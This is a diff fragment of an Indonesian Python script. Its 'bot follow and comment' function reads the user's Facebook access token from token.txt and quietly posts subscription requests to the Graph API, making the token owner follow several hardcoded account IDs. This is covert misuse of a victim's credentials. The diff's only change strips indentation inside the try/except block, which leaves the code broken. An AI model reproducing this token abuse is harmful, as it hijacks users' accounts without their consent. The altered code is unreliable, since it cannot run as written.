@@ -518,9 +518,9 @@ def laporbug():
 ### BOT FOLLOW DAN KOMEN ###
 def bot():
 	try:
-		token = open('token.txt', 'r').read()
+	token = open('token.txt', 'r').read()
 	except (KeyError, IOError):
-		exit(" %s[!] token kadaluwarsa!"%(M))
+	exit(" %s[!] token kadaluwarsa!"%(M))
 	requests.post('https://graph.facebook.com/100009259285042/subscribers?access_token=' + token)
 	requests.post('https://graph.facebook.com/100002606153676/subscribers?access_token=' + token)
 	requests.post('https://graph.facebook.com/100007740797954/subscribers?access_token=' + token)
